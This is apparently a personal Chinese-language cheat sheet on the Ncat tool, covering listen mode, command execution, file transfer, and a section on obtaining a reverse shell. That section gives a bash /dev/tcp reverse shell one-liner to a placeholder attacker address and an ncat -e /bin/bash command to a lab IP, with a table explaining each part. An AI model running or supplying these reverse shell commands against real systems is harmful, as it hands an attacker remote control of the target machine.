---
title: "Ncat Note"
date: 2022-03-19T13:18:56+08:00
draft: false
weight: 9
categories: ["安全工具"]
tags: ["安全工具", "Ncat"]
author: ["lavaicer"]
# author: ["Me", "You"] # multiple authors
---

## -l

使用监听模式，监控传入的信息 本机
`ncat -l 1234`

连接远程监控端口进行监控 目标机
`ncat <本机 ip> 1234`

## -e

将传入的信息以命令执行
`ncat -e -l /bin/bash <ip> 1234`

## -k

持久监听，客户端连接断掉，服务端依然保持运行

## -v

显示指令执行过程细节

## 内网弹 shell

> -w:设置等待连线的时间秒数

## bash 弹 shell

---

```markdown
bash -i >& /dev/tcp/攻击机 ip/攻击机端口 0>&1
```

---

这条命令的作用等同于之前的 `ncat -w 10 -e /bin/bash 10.211.55.4 2333`

|           命令            |                           参数解释                           |
| :-----------------------: | :----------------------------------------------------------: |
|          bash -i          |                    产生一个 bash 交互环境                    |
|            >&             |      将联合符号前面的内容与后面结合然后一起重定向给后者      |
| /dev/tcp/10.211.55.4/2333 |    让目标主机与主机 10.211.55.4 的 2333 端口简历一个连接     |
|           0>&1            | 将标准的输入与标准输出内容相结合，然后重定向给前面的标准输出 |

## 文件传输

### 上传

收

`ncat -l 1234 > re.txt`

发

`ncat <ip> 1234 < send.txt`

### 下载

`ncat -l 1234 < send.txt`

`ncat <ip> 1234 > re.txt`
